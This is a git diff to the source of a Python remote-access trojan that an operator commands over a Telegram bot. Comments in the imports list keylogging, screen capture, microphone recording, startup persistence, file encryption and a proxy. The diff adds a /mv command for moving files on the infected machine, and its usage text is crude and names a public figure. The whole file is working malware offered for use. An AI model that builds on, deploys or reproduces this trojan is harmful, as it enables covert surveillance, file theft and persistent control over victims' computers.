@@ -1,25 +1,25 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-from PIL import ImageGrab 							# /capture_pc
-from shutil import copyfile, copyfileobj, rmtree 	# /ls, /pwd, /cd /copy
-from sys import argv, path, stdout 					# console output
-from json import loads 								# reading json from ipinfo.io
-from winshell import startup 						# persistence
-from tendo import singleton							# this makes the application exit if there's another instance already running
-from win32com.client import Dispatch				# used for WScript.Shell
+from PIL import ImageGrab 								# /capture_pc
+from shutil import copyfile, copyfileobj, rmtree, move 	# /ls, /pwd, /cd, /copy, /mv
+from sys import argv, path, stdout 						# console output
+from json import loads 									# reading json from ipinfo.io
+from winshell import startup 							# persistence
+from tendo import singleton								# this makes the application exit if there's another instance already running
+from win32com.client import Dispatch					# used for WScript.Shell
 from time import strftime, sleep					
-import base64										# /encrypt_all
-import datetime										# /schedule
+import base64											# /encrypt_all
+import datetime											# /schedule
 import time
-import threading 									# /proxy, /schedule
+import threading 										# /proxy, /schedule
 import proxy
-import pyaudio, wave 								# /hear
-import telepot, requests 							# telepot => telegram, requests => file download
+import pyaudio, wave 									# /hear
+import telepot, requests 								# telepot => telegram, requests => file download
 from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
 import os, os.path, platform, ctypes
-import pyHook, pythoncom 							# keylogger
-import socket										# internal IP
-import getpass										# get username
+import pyHook, pythoncom 								# keylogger
+import socket											# internal IP
+import getpass											# get username
 import collections
 me = singleton.SingleInstance() 
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
@@ -129,7 +129,7 @@ def handle(msg):
 	chat_id = msg['chat']['id']
 	if checkchat_id(chat_id):
 		if 'text' in msg:
-			print '\t\tGot message from ' + str(chat_id) + ': ' + msg['text']
+			print '\n\t\tGot message from ' + str(chat_id) + ': ' + msg['text'] + '\n\n'
 			command = msg['text']
 			response = ''
 			if command == '/arp':
@@ -275,6 +275,19 @@ def handle(msg):
 				for file in files:
 					human_readable += file + '\n'
 				response = human_readable
+			elif command.startswith('/mv'):
+				command = command.replace('mv', '')
+				if len(command) > 0:
+					file1 = command.split('"')[1];
+					file2 = command.split('"')[3];
+					try:
+						move(file1, file2)
+						response = 'Files moved succesfully.'
+					except Exception as e:
+						response = 'Error: \n' + str(e)
+				else:
+					response = 'Usage: /mv "C:/Users/DonaldTrump/Desktop/porn.jpg" "C:/Users/DonaldTrump/AppData/Roaming/Microsoft Windows/[pornography.jpg]"'
+					response += '\nDouble-Quotes are needed in both whitespace-containing and not containing path(s)'
 			elif command.startswith('/msg_box'):
 				message = command.replace('/msg_box', '')
 				if message == '':
